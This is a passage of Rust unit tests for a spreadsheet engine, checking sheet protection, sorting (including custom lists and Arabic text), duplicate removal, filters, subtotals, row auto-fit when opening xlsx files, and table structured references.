    // Inserting shifts locked cells, which the protection allows.
    s.execute("home.insertRows", json!({"rows": "1:1"})).unwrap();
    assert_eq!(v(&s, "A2"), Value::Number(1.0));
    s.execute("home.insertColumns", json!({"cols": "A:A"})).unwrap();
    // Deleting a row with locked cells isn't; deleting an unlocked row is.
    assert!(s.execute("home.deleteRows", json!({"rows": "2:2"})).is_err());
    s.execute("home.deleteRows", json!({"rows": "11:11"})).unwrap();
    assert!(s.execute("home.deleteColumns", json!({"cols": "Z:Z"})).is_err());
}

#[test]
fn hidden_formulas_stay_hidden_on_protected_sheets() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "=SEQUENCE(3)*7"})).unwrap();
    s.execute("cell.set", json!({"cell": "B1", "input": "=1+1"})).unwrap();
    s.execute("home.formatCells", json!({"range": "A1", "style": {"protection": {"locked": true, "hidden": true}}})).unwrap();
    s.execute("formulas.showFormulas", json!({"on": true})).unwrap();
    let text = |s: &Session, a: &str| {
        let d = s.doc().unwrap();
        let sh = d.wb.active().unwrap();
        crate::display::cell_text(&d.wb, sh, CellRef::parse(a).unwrap())
    };
    assert_eq!(text(&s, "A1"), "=SEQUENCE(3)*7");
    assert_eq!(s.execute("edit.find", json!({"what": "SEQUENCE", "all": true})).unwrap()["count"], 1);
    s.execute("review.protectSheet", json!({})).unwrap();
    assert_eq!(text(&s, "A1"), "7");
    assert_eq!(text(&s, "B1"), "=1+1");
    let d = s.doc().unwrap();
    let sh = d.wb.active().unwrap();
    assert!(crate::display::formula_hidden(&d.wb, sh, CellRef::parse("A2").unwrap()));
    assert!(!crate::display::formula_hidden(&d.wb, sh, CellRef::parse("B1").unwrap()));
    assert!(s.execute("edit.find", json!({"what": "SEQUENCE", "all": true})).is_err());
    let r = s.execute("edit.find", json!({"what": "7", "all": true})).unwrap();
    assert_eq!(r["results"][0]["value"], "7");
}

#[test]
fn case_sensitive_sort_puts_lowercase_first() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["b"], ["B"], ["Ab"], ["a"], ["aB"], ["A"]]})).unwrap();
    s.execute("data.sort", json!({"range": "A1:A6", "header": false, "matchCase": true, "keys": [{"column": "A"}]})).unwrap();
    let col: Vec<Value> = (1..=6).map(|r| v(&s, &format!("A{r}"))).collect();
    assert_eq!(col, ["a", "A", "aB", "Ab", "b", "B"].map(Value::from));
}

/// #3949: Excel sorts values that are not in the custom list A to Z after the listed ones.
#[test]
fn custom_list_sort_puts_unlisted_values_after_the_list_in_order() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Priority"], ["Zulu"], ["Alpha"], ["Low"], ["High"], ["Medium"]]})).unwrap();
    let key = json!({"column": "A", "order": "asc", "customList": ["High", "Medium", "Low"]});
    s.execute("data.sort", json!({"range": "A1:A6", "header": true, "keys": [key]})).unwrap();
    let col: Vec<Value> = (1..=6).map(|r| v(&s, &format!("A{r}"))).collect();
    assert_eq!(col, ["Priority", "High", "Medium", "Low", "Alpha", "Zulu"].map(Value::from));
}

/// #3949 changes only an ascending custom-list key: with a descending one, two values not in the
/// list still tie, so the next key orders them.
#[test]
fn descending_custom_list_sort_leaves_unlisted_values_to_the_next_key() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "N"], ["Zulu", 2], ["Alpha", 1], ["High", 3]]})).unwrap();
    let keys = json!([
        {"column": "A", "order": "desc", "customList": ["High", "Medium", "Low"]},
        {"column": "B", "order": "asc"}
    ]);
    s.execute("data.sort", json!({"range": "A1:B4", "header": true, "keys": keys})).unwrap();
    let col: Vec<Value> = (2..=4).map(|r| v(&s, &format!("A{r}"))).collect();
    assert_eq!(col, ["Alpha", "Zulu", "High"].map(Value::from));
}

/// A blank in a descending custom-list key goes last, after the list, rather than tying with the
/// values that are not in the list (which come first), so the order is the same whatever the input.
#[test]
fn descending_custom_list_sort_puts_blanks_last() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name"], [null], ["High"], ["Zulu"]]})).unwrap();
    let key = json!({"column": "A", "order": "desc", "customList": ["High", "Medium", "Low"]});
    s.execute("data.sort", json!({"range": "A1:A4", "header": true, "keys": [key]})).unwrap();
    let col: Vec<Value> = (2..=4).map(|r| v(&s, &format!("A{r}"))).collect();
    assert_eq!(col, [Value::from("Zulu"), Value::from("High"), Value::Empty]);
}

#[test]
fn data_sort_orders_vowelled_arabic_by_letters() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["بيت"], ["بَاب"], ["تمر"], ["\u{200F}بحر"]]})).unwrap();
    s.execute("data.sort", json!({"range": "A1:A4", "header": false, "keys": [{"column": "A"}]})).unwrap();
    let col: Vec<Value> = (1..=4).map(|r| v(&s, &format!("A{r}"))).collect();
    assert_eq!(col, ["بَاب", "\u{200F}بحر", "بيت", "تمر"].map(Value::from));
}

#[test]
fn data_sort_orders_marks_and_digit_scripts_like_excel() {
    // Excel 16.0 (build 20527, en-US) sorts this column, as text, into exactly this order.
    let want = ["١٢", "۱۲", "ب\u{064E}1", "ب\u{064E}١", "بa", "\u{200F}باب", "ب\u{064B}اب", "ب\u{064E}اب", "ب\u{0652}اب", "ب\u{0651}اب"];
    let mut s = s();
    s.execute("home.numberFormat", json!({"range": "A1:A10", "code": "@"})).unwrap();
    let input: Vec<Vec<&str>> = want.iter().rev().map(|t| vec![*t]).collect();
    s.execute("range.setValues", json!({"range": "A1", "values": input})).unwrap();
    s.execute("data.sort", json!({"range": "A1:A10", "header": false, "keys": [{"column": "A"}]})).unwrap();
    let col: Vec<Value> = (1..=10).map(|r| v(&s, &format!("A{r}"))).collect();
    assert_eq!(col, want.map(Value::from));
}

#[test]
fn sort_with_a_sheet_prefix_sorts_the_named_sheet() {
    let col = |s: &Session, sheet: &str| -> Vec<Value> {
        let wb = &s.doc().unwrap().wb;
        let sh = wb.sheet(wb.sheet_index(sheet).unwrap()).unwrap();
        (1..=3).map(|r| sh.value(CellRef::new(r, 0))).collect()
    };
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "Qty"], ["a", 3], ["b", 1], ["c", 2]]})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Prices"})).unwrap();
    s.execute("range.setValues", json!({"range": "Prices!A1", "values": [["Item", "Price"], ["p1", 10], ["p2", 30], ["p3", 20]]})).unwrap();
    s.execute("sheet.activate", json!({"sheet": "Sheet1"})).unwrap();
    let r = s.execute("data.sort", json!({"range": "Prices!A1:B4", "header": true, "keys": [{"column": "B", "order": "desc"}]})).unwrap();
    assert_eq!(r["sorted"], "A2:B4");
    assert_eq!(col(&s, "Prices"), ["p2", "p3", "p1"].map(Value::from));
    assert_eq!(col(&s, "Sheet1"), ["a", "b", "c"].map(Value::from));
    s.execute("data.sortAscending", json!({"range": "Prices!A2:B4", "column": "B"})).unwrap();
    assert_eq!(col(&s, "Prices"), ["p1", "p3", "p2"].map(Value::from));
    assert_eq!(col(&s, "Sheet1"), ["a", "b", "c"].map(Value::from));
    // The selection belongs to the active sheet, so another sheet needs its range.
    assert!(s.execute("data.sort", json!({"sheet": "Prices", "keys": [{"column": "B"}]})).is_err());
    assert!(s.execute("data.sort", json!({"range": "Nowhere!A1:B4", "keys": [{"column": "B"}]})).is_err());
    assert_eq!(col(&s, "Sheet1"), ["a", "b", "c"].map(Value::from));
}

#[test]
fn remove_duplicates_compares_shown_text() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Date", "Price"], ["2006-03-08", 1.01], ["2006-03-08", 1.02]]})).unwrap();
    s.execute("home.numberFormat", json!({"range": "A3", "code": "mmm d, yyyy"})).unwrap();
    s.execute("home.numberFormat", json!({"range": "B2:B3", "code": "0.0"})).unwrap();
    let r = s.execute("data.removeDuplicates", json!({"range": "A1:A3", "header": true})).unwrap();
    assert_eq!(r["removed"], 0);
    let r = s.execute("data.removeDuplicates", json!({"range": "B1:B3", "header": true})).unwrap();
    assert_eq!(r["removed"], 1);
}

#[test]
fn remove_duplicates_with_a_sheet_prefix_works_on_the_named_sheet() {
    let col = |s: &Session, sheet: &str| -> Vec<Value> {
        let wb = &s.doc().unwrap().wb;
        let sh = wb.sheet(wb.sheet_index(sheet).unwrap()).unwrap();
        (1..=3).map(|r| sh.value(CellRef::new(r, 0))).collect()
    };
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name"], ["a"], ["a"], ["a"]]})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Prices"})).unwrap();
    s.execute("range.setValues", json!({"range": "Prices!A1", "values": [["Item"], ["p1"], ["p1"], ["p2"]]})).unwrap();
    s.execute("sheet.activate", json!({"sheet": "Sheet1"})).unwrap();
    let r = s.execute("data.removeDuplicates", json!({"range": "Prices!A1:A4", "header": true})).unwrap();
    assert_eq!(r["removed"], 1);
    assert_eq!(col(&s, "Prices"), [Value::from("p1"), Value::from("p2"), Value::Empty]);
    assert_eq!(col(&s, "Sheet1"), ["a", "a", "a"].map(Value::from));
    // The selection belongs to the active sheet, so another sheet needs its range.
    assert!(s.execute("data.removeDuplicates", json!({"sheet": "Prices", "header": true})).is_err());
    assert!(s.execute("data.removeDuplicates", json!({"sheet": "Sheet1", "range": "Prices!A1:A4", "header": true})).is_err());
    assert!(s.execute("data.removeDuplicates", json!({"range": "Nowhere!A1:A4", "header": true})).is_err());
    assert_eq!(col(&s, "Sheet1"), ["a", "a", "a"].map(Value::from));
}

#[test]
fn filter_with_a_sheet_prefix_toggles_the_named_sheet() {
    let sheet = |s: &Session, name: &str| -> gridcraft_model::Sheet {
        let wb = &s.doc().unwrap().wb;
        wb.sheet(wb.sheet_index(name).unwrap()).unwrap().clone()
    };
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "Qty"], ["a", 3], ["b", 1]]})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Prices"})).unwrap();
    s.execute("range.setValues", json!({"range": "Prices!A1", "values": [["Item", "Price"], ["p1", 10], ["p2", 30]]})).unwrap();
    s.execute("sheet.activate", json!({"sheet": "Sheet1"})).unwrap();
    let r = s.execute("data.filter", json!({"range": "Prices!A1:B3"})).unwrap();
    assert_eq!(r["range"], "A1:B3");
    assert_eq!(sheet(&s, "Prices").autofilter.map(|a| a.range.a1()), Some("A1:B3".to_string()));
    assert!(sheet(&s, "Sheet1").autofilter.is_none());
    s.execute("data.filter", json!({"range": "Prices!A1:B3"})).unwrap();
    assert!(sheet(&s, "Prices").autofilter.is_none());
    assert!(sheet(&s, "Sheet1").autofilter.is_none());
    assert!(s.execute("data.filter", json!({"sheet": "Prices"})).is_err());
}

#[test]
fn filter_with_a_sheet_prefix_toggles_the_table_at_the_range() {
    let mut s = s();
    s.execute("home.insertSheet", json!({"name": "Prices"})).unwrap();
    s.execute("range.setValues", json!({"range": "Prices!A1", "values": [["Item", "Price"], ["p1", 10], ["p2", 30]]})).unwrap();
    s.execute("insert.table", json!({"range": "A1:B3", "header": true})).unwrap();
    s.execute("sheet.activate", json!({"sheet": "Sheet1"})).unwrap();
    // The active cell is outside the table's cells, so only `range` can find the table.
    s.execute("selection.set", json!({"range": "E10"})).unwrap();
    let prices = |s: &Session| {
        let wb = &s.doc().unwrap().wb;
        wb.sheet(wb.sheet_index("Prices").unwrap()).unwrap().clone()
    };
    assert!(prices(&s).tables[0].filter_button);
    s.execute("data.filter", json!({"range": "Prices!A2:B3"})).unwrap();
    assert!(!prices(&s).tables[0].filter_button);
    assert!(prices(&s).autofilter.is_none());
    assert!(s.doc().unwrap().wb.active().unwrap().autofilter.is_none());
}

#[test]
fn subtotal_with_a_sheet_prefix_works_on_the_named_sheet() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Name", "Qty"], ["x", 1], ["x", 2], ["y", 3]]})).unwrap();
    s.execute("home.insertSheet", json!({"name": "Prices"})).unwrap();
    s.execute("range.setValues", json!({"range": "Prices!A1", "values": [["Item", "Qty"], ["a", 1], ["a", 2], ["b", 4]]})).unwrap();
    s.execute("sheet.activate", json!({"sheet": "Sheet1"})).unwrap();
    let r = s.execute("data.subtotal", json!({"range": "Prices!A1:B4", "groupBy": "A", "columns": ["B"]})).unwrap();
    assert_eq!(r["groups"], 2);
    let wb = &s.doc().unwrap().wb;
    let prices = wb.sheet(wb.sheet_index("Prices").unwrap()).unwrap();
    let col = |sh: &gridcraft_model::Sheet, c: u32| -> Vec<Value> { (0..7).map(|r| sh.value(CellRef::new(r, c))).collect() };
    assert_eq!(col(prices, 0), ["Item", "a", "a", "a Total", "b", "b Total", "Grand Total"].map(Value::from));
    assert_eq!(col(prices, 1)[1..], [1.0, 2.0, 3.0, 4.0, 4.0, 7.0].map(Value::from));
    assert!(wb.styles.get(prices.style_id(CellRef::new(3, 0))).font.bold);
    assert_eq!(prices.rows.get(&1).map(|l| l.outline), Some(2));
    let sheet1 = wb.sheet(wb.sheet_index("Sheet1").unwrap()).unwrap();
    assert_eq!(col(sheet1, 0)[..4], ["Name", "x", "x", "y"].map(Value::from));
    assert!(sheet1.value(CellRef::new(4, 0)).is_empty());
    assert!(sheet1.rows.values().all(|l| l.outline == 0));
    assert!(s.execute("data.group", json!({"sheet": "Prices"})).is_err());
}

/// #3945: Excel groups every data and subtotal row under the grand total, so the details are at
/// level 2, the subtotals at level 1, and showing level 1 leaves only the grand total.
#[test]
fn subtotal_groups_everything_under_the_grand_total() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Group", "Amount"], ["A", 10], ["A", 20], ["B", 30]]})).unwrap();
    s.execute("data.subtotal", json!({"range": "A1:B4", "groupBy": "A", "columns": ["B"], "function": "sum"})).unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap();
    let levels: Vec<u8> = (0..7).map(|r| sh.rows.get(&r).map_or(0, |l| l.outline)).collect();
    assert_eq!(levels, [0, 2, 2, 1, 2, 1, 0]);
    let shown = |s: &Session| -> Vec<u32> { (0..7).filter(|&r| !s.doc().unwrap().wb.active().unwrap().is_row_hidden(r)).map(|r| r + 1).collect() };
    s.execute("data.showLevels", json!({"rows": 1})).unwrap();
    assert_eq!(shown(&s), [1, 7]);
    s.execute("data.showLevels", json!({"rows": 2})).unwrap();
    assert_eq!(shown(&s), [1, 4, 6, 7]);
    assert_eq!(v(&s, "B7"), Value::Number(60.0));
}

#[test]
fn formatting_and_styles() {
    let mut s = s();
    s.execute("selection.set", json!({"range": "A1:B2"})).unwrap();
    s.execute("home.bold", json!({})).unwrap();
    s.execute("home.fillColor", json!({"color": "#FFFF00"})).unwrap();
    s.execute("home.mergeCenter", json!({})).unwrap();
    let c = s.execute("cell.get", json!({"cell": "B2"})).unwrap();
    assert_eq!(c["style"]["font"]["bold"], true);
    assert_eq!(c["merge"], "A1:B2");
    s.execute("home.cellStyle", json!({"range": "D1", "name": "Good"})).unwrap();
}

#[test]
fn spill_references_roundtrip_through_xlsx() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "B1", "input": "=SEQUENCE(4)"})).unwrap();
    s.execute("cell.set", json!({"cell": "C1", "input": "=sum(b1#)"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Seq", "refersTo": "=Sheet1!$B$1#"})).unwrap();
    s.execute("cell.set", json!({"cell": "C2", "input": "=MAX(Seq)"})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "C1"})).unwrap()["formula"], "=SUM(B1#)");
    assert_eq!((v(&s, "C1"), v(&s, "C2")), (Value::Number(10.0), Value::Number(4.0)));
    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let b64 = r["base64"].as_str().unwrap().to_string();
    s.execute("file.open", json!({"name": "x.xlsx", "base64": b64})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "C1"})).unwrap()["formula"], "=SUM(B1#)");
    assert_eq!(s.doc().unwrap().wb.names[0].formula, "Sheet1!$B$1#");
    assert_eq!((v(&s, "C1"), v(&s, "C2")), (Value::Number(10.0), Value::Number(4.0)));
}

/// Fixture for the open-time row fit (issue #833): `row_info` = (size, custom, hidden) for
/// row 5 (index 4), `None` = no row entry at all. Cell A5 = "plain big bold" — whole-cell
/// font 20pt with `big_font`, plain 11pt without (a tall plain row's fit removes its entry).
/// 11pt cell in A1 for contrast rows. Built with the model API, never through commands —
/// commands would auto-fit the rows — and exported with `write_xlsx`, which omits `ht` for
/// rows without a size: exactly the bug's input.
fn big_font_workbook(row_info: Option<(f32, bool, bool)>, big_font: bool) -> Vec<u8> {
    let mut wb = gridcraft_model::Workbook::new();
    let big = wb.styles.derive(gridcraft_model::StyleId::DEFAULT, |s| s.font.size = 20.0);
    let sh = wb.sheet_mut(0).unwrap();
    sh.set_value(CellRef::new(0, 0), Value::text("small"));
    sh.set_value(CellRef::new(4, 0), Value::text("plain big bold"));
    if big_font {
        sh.set_style(CellRef::new(4, 0), big);
    }
    if let Some((size, custom, hidden)) = row_info {
        let e = sh.rows.entry(4).or_default();
        e.size = Some(size);
        e.custom = custom;
        e.hidden = hidden;
    }
    gridcraft_xlsx::write_xlsx(&wb).unwrap()
}

#[test] // A — the issue's repro
fn open_grows_default_height_rows_to_their_font() {
    let default_h = gridcraft_model::Workbook::new().active().unwrap().row_height(0);
    let mut s = Session::new();
    s.execute("file.open", json!({"name": "bigfont.xlsx", "base64": crate::io::base64_encode(&big_font_workbook(None, true))})).unwrap();
    let h = s.doc().unwrap().wb.active().unwrap().row_height(4);
    assert!(h >= 30.0, "20pt cell must grow its default-height row on open, got {h}");
    assert_eq!(s.doc().unwrap().wb.active().unwrap().row_height(0), default_h, "11pt row stays default");
}

#[test]
fn line_breaks_grow_a_row_only_when_the_cell_wraps() {
    // Excel: a cell holding "a\nb" with Wrap Text off displays on one line and AutoFit gives a
    // one-line row; with Wrap Text on it gets one line per break.
    // Typing a break (Alt+Enter) turns wrap on, as in Excel, so the unwrapped case comes from a
    // file, built with the model API and exported without row heights.
    let text = "first line\n\n\nfourth line";
    let bytes = {
        let mut wb = gridcraft_model::Workbook::new();
        let sh = wb.sheet_mut(0).unwrap();
        sh.set_value(CellRef::new(1, 1), Value::text(text));
        gridcraft_xlsx::write_xlsx(&wb).unwrap()
    };
    let default_h = gridcraft_model::Workbook::new().active().unwrap().row_height(1);
    let mut s = Session::new();
    s.execute("file.open", json!({"name": "notes.xlsx", "base64": crate::io::base64_encode(&bytes)})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().row_height(1), default_h, "an unwrapped multi-line cell keeps the default row height on open");
    // Turning wrap on lays the text out over its lines and the row grows to hold them.
    s.execute("home.wrapText", json!({"range": "B2", "on": true})).unwrap();
    let wrapped_h = s.doc().unwrap().wb.active().unwrap().row_height(1);
    assert!(wrapped_h > default_h * 2.5, "wrapped four-line text grows the row, got {wrapped_h} vs default {default_h}");
    // Turning it off again returns the row to one line.
    s.execute("home.wrapText", json!({"range": "B2", "on": false})).unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().row_height(1), default_h, "wrap off: back to a one-line row");
    // Entering a break by hand wraps the cell (Alt+Enter), so that row does grow.
    s.execute("cell.set", json!({"cell": "D4", "input": text})).unwrap();
    assert!(s.doc().unwrap().wb.active().unwrap().row_height(3) > default_h * 2.5, "typed line breaks turn wrap on and grow the row");
}

#[test] // B — Review Focus 1
fn open_keeps_custom_height_rows() {
    let mut s = Session::new();
    s.execute("file.open", json!({"name": "custom.xlsx", "base64": crate::io::base64_encode(&big_font_workbook(Some((25.0, true, false)), true))}))
        .unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().row_height(4), 25.0, "custom-height rows are left alone on open");
}

#[test] // C — Review Focus 2 (Some→Some: the fit shrinks the row, the clamp keeps the taller height)
fn open_never_shrinks_taller_auto_rows() {
    let mut s = Session::new();
    s.execute("file.open", json!({"name": "tall.xlsx", "base64": crate::io::base64_encode(&big_font_workbook(Some((60.0, false, false)), true))}))
        .unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().row_height(4), 60.0, "open is grow-only: a 60px auto-height row keeps its height");
}

#[test] // C′ — Review Focus 2 (Some→None: a plain tall row's entry is removed by the fit, the clamp restores it)
fn open_restores_height_of_plain_rows_the_fit_removed() {
    let mut s = Session::new();
    s.execute(
        "file.open",
        json!({"name": "tall-plain.xlsx", "base64": crate::io::base64_encode(&big_font_workbook(Some((60.0, false, false)), false))}),
    )
    .unwrap();
    assert_eq!(s.doc().unwrap().wb.active().unwrap().row_height(4), 60.0, "a tall plain row keeps its height after the fit removes its entry");
}

#[test] // D — Review Focus 5
fn open_fitting_keeps_hidden_rows_hidden() {
    let mut s = Session::new();
    s.execute("file.open", json!({"name": "hidden.xlsx", "base64": crate::io::base64_encode(&big_font_workbook(Some((20.0, false, true)), true))}))
        .unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap();
    let info = sh.rows.get(&4).unwrap();
    assert!(info.size.is_some_and(|h| h >= 20.0), "hidden row grows or keeps its height, got {:?}", info.size);
    assert!(info.hidden, "fitting a hidden row must not unhide it");
}

#[test] // E — Review Focus 4
fn open_leaves_plain_workbooks_untouched() {
    let mut s = Session::new();
    s.execute("file.open", json!({"name": "plain.xlsx", "base64": crate::io::base64_encode(&big_font_workbook(None, false))})).unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap();
    assert!(sh.rows.get(&0).is_none_or(|i| i.size.is_none()), "11pt default rows get no height entry");
    assert!(sh.rows.values().all(|i| i.size.is_none()), "no row gains a height entry");
}

/// Merged cells never auto-fit their rows, like Excel (issue #1605): a wrapped merged
/// header keeps the default height instead of growing to its column-A wrap width, while an
/// unmerged wrapped cell in the same sheet still fits.
#[test]
fn autofit_skips_merged_cells() {
    let mut s = s();
    s.execute("cell.set", json!({"cell": "A1", "input": "This is a long sentence that should wrap across the merged width of five columns"}))
        .unwrap();
    s.execute("home.mergeCells", json!({"range": "A1:E1"})).unwrap();
    s.execute("home.wrapText", json!({"range": "A1:E1", "on": true})).unwrap();
    s.execute("cell.set", json!({"cell": "A3", "input": "This is a long sentence that should wrap across the merged width of five columns"}))
        .unwrap();
    s.execute("home.wrapText", json!({"range": "A3", "on": true})).unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap();
    assert!(sh.rows.get(&0).is_none_or(|i| i.size.is_none()), "merged wrap must not auto-fit row 1, got {:?}", sh.rows.get(&0));
    assert!(sh.rows.get(&2).is_some_and(|i| i.size.is_some_and(|h| h > 15.0)), "unmerged wrap still fits its row");
    // The save writes no height for the merged row.
    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let bytes = crate::io::base64_decode(r["base64"].as_str().unwrap()).unwrap();
    let mut zip = zip::ZipArchive::new(std::io::Cursor::new(bytes)).unwrap();
    let mut xml = String::new();
    std::io::Read::read_to_string(&mut zip.by_name("xl/worksheets/sheet1.xml").unwrap(), &mut xml).unwrap();
    let row1 = xml.split("<row").skip(1).map(|r| format!("<row{r}")).find(|r| r.starts_with("<row r=\"1\"")).unwrap();
    assert!(!row1.split('>').next().unwrap().contains("ht="), "merged row 1 must be saved without ht, got {row1}");
    assert!(xml.contains("<mergeCell ref=\"A1:E1\"/>"), "the merge itself is saved");
}

#[test]
fn open_fits_big_font_rows_from_the_font_not_the_sheet_default() {
    // Excel saves a sheet whose rows hold 16pt text with a 21pt (28px) default row height and no
    // `ht` on rows of that height. Those rows already fit their font: they open at about 28px,
    // not scaled up again by 16/11 to 41px.
    let mut wb = gridcraft_model::Workbook::new();
    let big = wb.styles.derive(gridcraft_model::StyleId::DEFAULT, |s| s.font.size = 16.0);
    let sh = wb.sheet_mut(0).unwrap();
    sh.default_row_height = 28.0;
    sh.set_value(CellRef::new(4, 0), Value::text("SANTANDER"));
    sh.set_style(CellRef::new(4, 0), big);
    let bytes = gridcraft_xlsx::write_xlsx(&wb).unwrap();
    let mut s = Session::new();
    s.execute("file.open", json!({"name": "tall-default.xlsx", "base64": crate::io::base64_encode(&bytes)})).unwrap();
    let sh = s.doc().unwrap().wb.active().unwrap();
    assert_eq!(sh.default_row_height, 28.0);
    let h = sh.row_height(4);
    assert!((28.0..30.0).contains(&h), "a 16pt row on a 28px-default sheet opens at about 28px, got {h}");
}

#[test]
fn tables_and_structured_refs() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Item", "Qty"], ["x", 2], ["y", 5]]})).unwrap();
    s.execute("insert.table", json!({"range": "A1:B3"})).unwrap();
    s.execute("cell.set", json!({"cell": "D1", "input": "=SUM(Table1[Qty])"})).unwrap();
    assert_eq!(v(&s, "D1"), Value::Number(7.0));
    s.execute("table.totalRow", json!({"on": true, "table": "Table1"})).unwrap();
    assert_eq!(v(&s, "B4"), Value::Number(7.0));
}

#[test]
fn structured_refs_to_columns_with_edge_spaces() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Item", "Qty "], ["a", 2], ["b", 3]]})).unwrap();
    s.execute("insert.table", json!({"range": "A1:B3", "hasHeaders": true})).unwrap();
    s.execute("table.totalRow", json!({"on": true, "table": "Table1"})).unwrap();
    assert_eq!(v(&s, "B4"), Value::Number(5.0));
    for (cell, input) in [
        ("F1", "=SUM(Table1[Qty ])"),
        ("F2", "=Table1[[#Totals],[Qty ]]"),
        ("F3", "=SUBTOTAL(109,Table1[Qty ])"),
        ("F4", "=SUM(Table1[[Qty ]])"),
        ("F5", "=SUM(Table1[Qty])"),
        ("C2", "=Table1[@[Qty ]]*10"),
    ] {
        s.execute("cell.set", json!({"cell": cell, "input": input})).unwrap();
    }
    let n = Value::Number;
    assert_eq!([v(&s, "F1"), v(&s, "F2"), v(&s, "F3"), v(&s, "F4")], [n(5.0), n(5.0), n(5.0), n(5.0)]);
    assert_eq!(v(&s, "F5"), Value::Error(gridcraft_core::CellError::Ref));
    assert_eq!(v(&s, "C2"), n(20.0));
    assert_eq!(s.execute("cell.get", json!({"cell": "F3"})).unwrap()["formula"], "=SUBTOTAL(109,Table1[[Qty ]])");

    let r = s.execute("file.saveBytes", json!({"format": "xlsx"})).unwrap();
    let b64 = r["base64"].as_str().unwrap().to_string();
    s.execute("file.open", json!({"name": "x.xlsx", "base64": b64})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "F3"})).unwrap()["formula"], "=SUBTOTAL(109,Table1[[Qty ]])");
    assert_eq!([v(&s, "F1"), v(&s, "F2"), v(&s, "F3")], [n(5.0), n(5.0), n(5.0)]);
}

#[test]
fn changing_the_font_name_drops_the_old_fonts_charset_and_family() {
    let mut s = s();
    {
        let wb = std::sync::Arc::make_mut(&mut s.doc_mut().unwrap().wb);
        let arabic = wb.styles.derive(gridcraft_model::StyleId::DEFAULT, |st| {
            st.font.name = "Traditional Arabic".into();
            st.font.charset = Some(178);
            st.font.family = Some(1);
        });
        wb.sheet_mut(0).unwrap().set_style(CellRef::parse("A1").unwrap(), arabic);
    }
    s.execute("home.fontName", json!({"range": "A1", "name": "Arial"})).unwrap();
    let d = s.doc().unwrap();
    let font = &d.wb.styles.get(d.wb.active().unwrap().style_id(CellRef::parse("A1").unwrap())).font;
    assert_eq!((font.name.as_str(), font.charset, font.family), ("Arial", None, None));
}

#[test]
fn table_rename_keeps_a_defined_name_with_the_same_name() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Qty"], [7]]})).unwrap();
    s.execute("cell.set", json!({"cell": "D1", "input": "100"})).unwrap();
    s.execute("insert.table", json!({"range": "A1:A2", "header": true, "name": "Data"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Data", "refersTo": "=Sheet1!$D$1"})).unwrap();
    s.execute("cell.set", json!({"cell": "E1", "input": "=Data"})).unwrap();
    s.execute("cell.set", json!({"cell": "F1", "input": "=SUM(Data[Qty])"})).unwrap();
    s.execute("table.rename", json!({"table": "Data", "name": "Later"})).unwrap();
    assert_eq!(s.execute("cell.get", json!({"cell": "E1"})).unwrap()["formula"], "=Data");
    assert_eq!(s.execute("cell.get", json!({"cell": "F1"})).unwrap()["formula"], "=SUM(Later[Qty])");
    assert_eq!((v(&s, "E1"), v(&s, "F1")), (Value::Number(100.0), Value::Number(7.0)));
}

/// A workbook name that reads a same-named workbook name keeps reading it when the table is renamed.
#[test]
fn table_rename_keeps_a_workbook_name_reading_a_same_named_name() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Qty"], [7]]})).unwrap();
    s.execute("cell.set", json!({"cell": "D1", "input": "100"})).unwrap();
    s.execute("insert.table", json!({"range": "A1:A2", "header": true, "name": "Data"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Data", "refersTo": "=Sheet1!$D$1"})).unwrap();
    s.execute("formulas.defineName", json!({"name": "Twice", "refersTo": "=Data*2"})).unwrap();
    s.execute("table.rename", json!({"table": "Data", "name": "Later"})).unwrap();
    let twice = s.doc().unwrap().wb.names.iter().find(|n| n.name == "Twice").map(|n| n.formula.clone());
    assert_eq!(twice.as_deref(), Some("Data*2"));
}

#[test]
fn table_names_are_limited_to_255_characters() {
    let mut s = s();
    s.execute("range.setValues", json!({"range": "A1", "values": [["Qty"], [7]]})).unwrap();
    s.execute("insert.table", json!({"range": "A1:A2", "header": true, "name": "Original"})).unwrap();

    let name_255 = "ع".repeat(255);
    s.execute("table.rename", json!({"table": "Original", "name": name_255})).unwrap();
    assert!(s.doc().unwrap().wb.table(&"ع".repeat(255)).is_some());

    let name_256 = "ع".repeat(256);
    let error = s.execute("table.rename", json!({"table": &"ع".repeat(255), "name": name_256})).unwrap_err();
    assert!(error.to_string().contains("not valid"), "{error}");
    assert!(s.doc().unwrap().wb.table(&"ع".repeat(255)).is_some());

    let name_200 = "ع".repeat(200);
